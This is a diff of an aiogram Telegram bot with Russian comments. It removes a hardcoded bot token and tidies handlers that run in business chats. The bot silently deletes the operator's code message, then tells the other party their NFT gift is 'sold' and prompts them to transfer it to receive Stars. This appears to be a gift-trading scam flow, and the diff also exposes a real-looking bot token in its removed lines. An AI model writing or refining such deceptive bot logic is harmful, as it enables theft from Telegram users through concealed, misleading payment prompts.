@@ -10,7 +10,7 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
-BOT_TOKEN = "9197044993:AAGIPSPk-6A01KbpjxgW2QzGx3djAXZbQVw" # Вставь токен от BotFather
+BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА" # Вставь токен от BotFather
 MY_USERNAME = "oqraft" # Твой юзернейм без @
 
 bot = Bot(token=BOT_TOKEN)
@@ -55,14 +55,9 @@ async def activate_offer(message: types.Message):
     offer_data = offers_db[code]
     b_conn_id = message.business_connection_id
 
-    # Жесткое удаление сообщения с кодом
+    # Удаляем сообщение с командой
     try:
-        await bot.delete_message(
-            chat_id=message.chat.id, 
-            message_id=message.message_id, 
-            business_connection_id=b_conn_id
-        )
-        print("Команда удалена.")
+        await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id, business_connection_id=b_conn_id)
     except Exception as e:
         print(f"Ошибка удаления: {e}")
 
@@ -119,7 +114,7 @@ async def process_ok(callback: types.CallbackQuery):
         text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {data['amount']} ⭐."
         
         builder = InlineKeyboardBuilder()
-        # Теперь кнопка ведет не на сайт, а вызывает функцию инструкции
+        # Кнопка ведет на функцию с текстом
         builder.row(InlineKeyboardButton(text="Передать NFT", callback_data=f"how_{code}"))
         
         await bot.edit_message_text(
@@ -131,7 +126,7 @@ async def process_ok(callback: types.CallbackQuery):
         )
     await callback.answer()
 
-# --- ИНСТРУКЦИЯ (ТЕКСТ, КОТОРЫЙ ТЫ ПРОСИЛ) ---
+# --- ИНСТРУКЦИЯ ---
 @dp.callback_query(F.data.startswith("how_"))
 async def process_how_to(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
@@ -142,7 +137,6 @@ async def process_how_to(callback: types.CallbackQuery):
     )
     
     builder = InlineKeyboardBuilder()
-    # Кнопка возврата к офферу
     builder.row(InlineKeyboardButton(text="Вернуться к офферу", callback_data=f"back_{code}"))
     
     await bot.edit_message_text(
@@ -154,7 +148,7 @@ async def process_how_to(callback: types.CallbackQuery):
     )
     await callback.answer()
 
-# --- ВОЗВРАТ К ОФФЕРУ ---
+# --- ВОЗВРАТ ---
 @dp.callback_query(F.data.startswith("back_"))
 async def process_back(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
@@ -175,7 +169,6 @@ async def process_back(callback: types.CallbackQuery):
         )
     await callback.answer()
 
-# --- КНОПКА ОТКЛОНИТЬ ---
 @dp.callback_query(F.data.startswith("dec_"))
 async def process_decline(callback: types.CallbackQuery):
     b_conn_id = callback.message.business_connection_id
